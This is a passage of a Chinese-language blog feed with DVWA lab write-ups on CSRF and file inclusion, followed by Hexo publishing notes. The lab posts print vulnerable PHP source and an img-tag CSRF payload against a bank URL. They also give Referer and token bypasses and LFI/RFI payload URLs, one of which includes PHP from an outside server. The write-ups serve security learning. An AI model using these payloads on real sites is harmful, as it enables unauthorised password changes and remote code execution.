利用的是网站对用户网页浏览器的信任。</p><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br>例子<br>假如一家银行用以运行转账操作的URL地址如下：<code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code><br>那么，一个恶意攻击者可以在另一个网站上放置如下代码： <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman"><br>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。<br>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。<br><strong>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义运行操作。</strong></p><h4 id="与XSS区别："><a href="#与XSS区别：" class="headerlink" title="与XSS区别："></a>与XSS区别：</h4><p>XSS是通过修改页面Javascript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。<br> CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作并不是黑客，而是用户本身。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_45382656/article/details/103828019" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45382656/article/details/103828019</a></p><p>参考链接：<a href="https://baike.baidu.com/item/跨站请求伪造/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/跨站请求伪造/13777878?fromtitle=CSRF&amp;fromid=2735433&amp;fr=aladdin</a></p></blockquote><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?判断是否相同    if( $pass_new == $pass_conf ) {        // They do!下边将特殊字符转义，然后进行MD5加密，然后更新数据库；        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database更新数据库        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);//关闭数据库连接}?&gt; </code></pre><p><strong>1、mysql_real_escape_string() 函数:</strong>  转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：<br>\x00<br>\n<br>\r<br><br>‘<br>“<br>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>mysql_real_escape_string(string,connection)<br>string<br>必需。规定要转义的字符串。<br>connection<br>可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</p><p><strong>2、trigger_error() 函数</strong>:  创建用户级别的错误消息。<br>trigger_error() 函数能结合内置的错误处理器所关联，或者可以使用用户定义的函数作为新的错误处理程序(set_error_handler())。</p><p>trigger_error(errormsg,errortype);<br>errormsg<br>必需。规定错误消息。最大长度 1024 字节。<br>errortype<br>可选。规定错误类型。可能的值：E_USER_ERROR、E_USER_WARNING、E_USER_NOTICE（默认）</p><p>服务器通过GET方式接收修改密码的请求，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。这段代码直接将新密码写进数据库，没有验证用户的旧密码，也没有对http引用进行确认，就只判断了是不是两次输入相等而已，这样任何别的网站都可以用你cookies对你的帐户进行CSRF攻击。</p><h4 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h4><p>两个地方均填123，发现提交成功（因为只判断二者是否相等）。用burpsuite抓包，右键Engagement tools-&gt;Generate CSRF RoC，会自动生成html代码，把它存在F盘，命名为csrf1.html。</p><p>在另一个网页打开file:///F:/csrf1.html,页面会出现submit request的按钮，点击则成功修改密码。跳转到dvwa登录界面，会发现原本的密码已经无法登陆，密码为123。</p><p>（可以伪造成一个链接，受害者点击后密码就会被修改）</p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Checks to see where the request came from检查请求来自哪里    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) {//加了HTTP_REFERER验证,当$_SERVER中HTTP_REFERER有SERVER_NAME的值时候，才能进行改密码操作。 //$_SERVER[&#39;HTTP_REFERER&#39;] #链接到当前页面的前一页面的 URL 地址。 //$_SERVER[&#39;SERVER_NAME&#39;] #当前运行脚本所在服务器主机的名称。//把之前的csrf1.html文件重命名为dvwa.com.html可以达到绕过的目的                // Get input        $pass_new  = $_GET[ &#39;password_new&#39; ];        $pass_conf = $_GET[ &#39;password_conf&#39; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) {            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        }        else {            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        }    }    else {        // Didn&#39;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}?&gt; </code></pre><p>stripos(string,find,start)函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>注释：stripos() 函数是不区分大小写的。<br>注释：该函数是二进制安全的。<br>string<br>必需。规定要搜索的字符串。<br>find<br>必需。规定要查找的字符。<br>start<br>可选。规定开始搜索的位置。</p><h4 id="实战：-1"><a href="#实战：-1" class="headerlink" title="实战："></a>实战：</h4><p>同样利用burpsuite进行csrf攻击，文件命名为dvwa.com.html就可以绕过，成功修改密码。</p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php"> &lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Check Anti-CSRF token采用token验证    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可利用burpsuite中的CSRF Token Tracker绕过token验证插件</p><h4 id="实战：-2"><a href="#实战：-2" class="headerlink" title="实战："></a>实战：</h4><p>burpsuite-&gt;Extender-&gt;BApp Store-&gt;CSRF Token Tracker-&gt;右边页面install</p><p>栏目多了CSRF Token Tracker，点击进入页面-&gt;√Sync requests…-&gt;host填写<a href="http://127.0.0.1，Name填user_token,Value填token字段，并√" target="_blank" rel="noopener">http://127.0.0.1，Name填user_token,Value填token字段，并√</a></p><p>然后将抓到的包send to repeater 可以发现token的值是随机的，登录会发现密码修改成功。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_45382656/article/details/103828019" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45382656/article/details/103828019</a></p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_curr = $_GET[ &#39;password_current&#39; ];    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Sanitise current password input    $pass_curr = stripslashes( $pass_curr );//删除反斜杠    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass_curr = md5( $pass_curr );    // Check that the current password is correct验证本来的密码对不对    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );    $data-&gt;execute();    // Do both new passwords match and does the current password match the user?    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {        // It does!        $pass_new = stripslashes( $pass_new );        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update database with new password        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;execute();        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>Impossible Security Level的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><p> 1、什么是PDO？            </p><p>PDO就是PHP data Object 提供了PHP操作多种数据库的统一的接口    </p><p>2、为什么要使用PDO？                </p><p>PDO是PHP5新加入的一个重大功能，我们的数据库服务器为MySQL，所有的程序代码的数据库操作全是一mysql(）或者mysqli()函数来操作，当我们的数据库 需要更换时比如换成，SQL、SERVER、PostgreSQL、MS 等，我们不可能去修改所有的程序代码！所以就要用到PDO，PDO很好的帮我们解决了这个问题，使用PDO操作非常方便，只需要修改数据源格式，和加载相应的驱动文件到PHP.ini即可；    </p><p>原文链接：<a href="https://blog.csdn.net/jiuyue9561/java/article/details/80379910" target="_blank" rel="noopener">https://blog.csdn.net/jiuyue9561/java/article/details/80379910</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-CSRF跨站请求伪造&quot;&gt;&lt;a href=&quot;#DVWA-CSRF跨站请求伪造&quot; class=&quot;headerlink&quot; title=&quot;DVWA CSRF跨站请求伪造&quot;&gt;&lt;/a&gt;DVWA CSRF跨站请求伪造&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;跨站请求伪
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Dvwa 文件包含漏洞（File Inclusion）</title>
    <link href="http://yoursite.com/2020/05/16/Dvwa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/16/Dvwa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/</id>
    <published>2020-05-16T14:20:48.522Z</published>
    <updated>2020-07-06T14:42:03.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dvwa-文件包含漏洞（File-Inclusion）"><a href="#Dvwa-文件包含漏洞（File-Inclusion）" class="headerlink" title="Dvwa 文件包含漏洞（File Inclusion）"></a>Dvwa 文件包含漏洞（File Inclusion）</h1><p>原理理解参考链接：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p><p><strong>File Inclusion</strong>，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数，利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<br>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><p>1、文件包含即程序通过包含函数调用本地或远程文件，以此来实现拓展功能<br>2、被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。</p><p>3、文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等函数。</p><h5 id="文件包含分为两类："><a href="#文件包含分为两类：" class="headerlink" title="文件包含分为两类："></a>文件包含分为两类：</h5><p>本地文件包含LFI（local file include）当被包含的文件在服务器本地时，就形成本地文件包含<br>远程文件包含RFI（remote file include）当被包含的文件在第三方服务器时，叫做远程文件包含。</p><h5 id="某些特性函数"><a href="#某些特性函数" class="headerlink" title="某些特性函数"></a>某些特性函数</h5><p>require:找不到被包含的文件，报错，并且停止运行脚本。<br>include:找不到被包含的文件,只会报错，但会继续运行脚本。<br>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p><p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p><p><strong>相关的 php.ini 配置参数：</strong></p><p>allow_url_fopen = on （默认开启）<br>allow_url_include = on （默认关闭）</p><p>远程文件包含是因为开启了 php 配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p>参考链接：<a href="https://www.cnblogs.com/leeqizhi/p/11469943.html" target="_blank" rel="noopener">https://www.cnblogs.com/leeqizhi/p/11469943.html</a> <a href="https://www.cnblogs.com/heiwa-0924/p/12457423.html" target="_blank" rel="noopener">https://www.cnblogs.com/heiwa-0924/p/12457423.html</a></p><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];//$_GET数组复中传递的是通过制url传递的值，page是数组度的下标//如：url为http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=1&amp;id=2//那么传递过道来的$_GET数组中: $_GET[&#39;page&#39;]=1  $_GET[&#39;id&#39;]=2?&gt; </code></pre><p>服务器端对page参数没有做任何的过滤跟检查。服务器希望用户点击图中的三个链接，服务器会包含相应文件，并将结果返回。需要说明的是。不管文件后缀是否是php，都会当做php文件执行，如果文件内容确认为php，则正常执行并返回结果，如果不是，则返回打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><h4 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h4><p>1、点击file1.php后，url为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file1.php</code></p><p>2、在F盘新建一个123.txt文件内容为helloworld,更改url：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=F:\123.txt</code>发现屏幕上方显示了helloworld，即成功读取。新建php文件并修改url也是同等效果。</p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt; </code></pre><p>str_replace(find,replace,string,count)： 以其他字符替换字符串中的一些字符（区分大小写）。<br>find<br>必需。规定要查找的值。<br>replace<br>必需。规定替换 find 中的值的值。<br>string<br>必需。规定被搜索的字符串。<br>count<br>可选。对替换数进行计数的变量。</p><p>从源码中可以看到http://、https://、../、..\会被替换为空字符，可以用双写绕过。同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的，采用绝对路径的办法不受影响。所以我们的语句也与上面基本相同，只是在被替换的地方双写一下即可</p><h4 id="实战：-1"><a href="#实战：-1" class="headerlink" title="实战："></a>实战：</h4><p>本地包含：low级别的url在medium级别仍旧可以用。</p><p>远程包含：我把1.php传到服务器的root目录底下，因此url改为</p><p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/root/1.php</code></p><p>出错提示：</p><p><strong>Warning</strong>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: no suitable wrapper could be found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p>尝试的法1：<a href="http://www.voidcn.com/article/p-ddodmxtt-buo.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ddodmxtt-buo.html</a></p><p>尝试的法2：想在远程服务器里编辑php.ini，结果报错</p><p>root@iZbp1342kjcxfvbybtm200Z:<del># find / -name php.ini<br>/etc/php/7.0/apache2/php.ini<br>/etc/php/7.0/cli/php.ini<br>root@iZbp1342kjcxfvbybtm200Z:</del># vim /etc/php5/cgi/php.ini<br>Error detected while processing /usr/share/vim/vimrc:<br>line   20:<br>E484: Can’t open file /usr/share/vim/vim81/syntax/syntax.vim</p><p>应该是vim的问题，彻底卸载重装vim：<a href="https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃" target="_blank" rel="noopener">https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃</a></p><p>尝试的法3：可能是Apache的问题，点击本地Apache的php.ini，发现allow_url_include=Off，修改成on，仍旧报错（<a href="https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错" target="_blank" rel="noopener">https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错</a></p><p>报错内容变为：</p><p><strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p>意思应该为路径错误，才想到自己根本就没把1.php放在根目录下，把1.php放到根目录下边，然后url改为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/1.php</code> 成功包含。</p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation文件如果不是include.php就得是file开头的文件if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt; </code></pre><p>代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>fnmatch(pattern,string,flags)函数根据指定的模式来匹配文件名或字符串。<br>pattern<br>必需。规定要检索的模式。<br>string<br>必需。规定要检查的字符串或文件。<br>flags<br>可选。</p><p>我们可以利用file协议绕过防护策略。当我们用浏览器打开一个本地文件时，用的就是file协议。（file-本地传输协议 主要用于访问本地计算机中的文件）<br>file:///path 这个可以直接访问文件(file://也行)</p><h4 id="实战：-2"><a href="#实战：-2" class="headerlink" title="实战："></a>实战：</h4><p>输入<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///F:\1.php</code></p><p>file后边是路径，成功包含。</p><p>（备注：至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行。）</p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Only allow include.php or file{1..3}.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exiphpt;}?&gt; </code></pre><p>代码直接限制了page的参数，没法再攻击。</p><p>参考链接：<a href="https://www.cnblogs.com/yyxianren/p/11381111.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyxianren/p/11381111.html</a></p><p><a href="https://www.cnblogs.com/Loong716/p/10391324.html" target="_blank" rel="noopener">https://www.cnblogs.com/Loong716/p/10391324.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Dvwa-文件包含漏洞（File-Inclusion）&quot;&gt;&lt;a href=&quot;#Dvwa-文件包含漏洞（File-Inclusion）&quot; class=&quot;headerlink&quot; title=&quot;Dvwa 文件包含漏洞（File Inclusion）&quot;&gt;&lt;/a&gt;Dvwa 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>发博客的一点记录</title>
    <link href="http://yoursite.com/2020/05/14/%E5%8F%91%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/05/14/%E5%8F%91%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-14T13:41:35.270Z</published>
    <updated>2020-07-07T07:47:50.453Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo写博客的一点记录"><a href="#Hexo写博客的一点记录" class="headerlink" title="Hexo写博客的一点记录"></a>Hexo写博客的一点记录</h1><p>1.用Typora编写博客</p><p>2.存到 \ source\ _posts 底下，空白处右键Git Bash Here</p><p>3.输入</p><p><strong>hexo clean</strong> :  清除缓存文件 db.json 和已生成的静态文件 public 。</p><p>备注：网站显示异常时可以执行这条命令试试。</p><p><strong>hexo g</strong> :  生成网站静态文件到默认设置的 public 文件夹。</p><p>备注：</p><p>1）便于查看网站生成的静态文件或者手动部署网站；</p><p>2）如果使用自动部署，不需要先执行该命令；</p><p>3）hexo g 是 hexo generate 的缩写，命令效果一致。</p><p>4）简单来说，这一步是为了预览，你可以在localhost：4000查看</p><p><strong>hexo d</strong>：自动生成网站静态文件，并部署到设定的仓库。</p><p>（备注：hexo d 是 hexo deploy 的缩写，命令效果一致。）</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>部署过程中第一次弹出的小框是写登录git的用户名（或者邮箱名）与密码，如果登陆失败，会出现…failed…让你Crtl+C退出；成功的话，下面有个大约长两cm宽0.5cm的长方形阴影。</p><p>然后第二次弹出的长条小方框Openssh，第一次要填登录git的邮箱，第二次password要填personal access token！</p><p>（git账号头像旁边的倒三角-&gt;settings-&gt;Developer settings-&gt;Personal access tokens）</p><p>Personal access tokens页面下面有可点击的链接点进去，进入Edit personal access token页面，点击下边红字Regenerate token即可生成token，复制填入。</p><p>部署成功。</p><p>创建token所参考的官网链接：<a href="https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line" target="_blank" rel="noopener">https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line</a></p><h3 id="插入图片："><a href="#插入图片：" class="headerlink" title="插入图片："></a>插入图片：</h3><p>1、博客根目录下 查看_config.yml文件 查找 post_asset_folder 字段确定post_asset_folder 设置为true -&gt; post_asset_folder:true</p><p>2、当您设置 post_asset_folder  参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到此文件夹内，这样就可以更方便的使用资源。</p><p>3、到博客的根目录下执行 npm install <a href="https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FCodeFalling%2Fhexo-asset-image" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image</a> –save 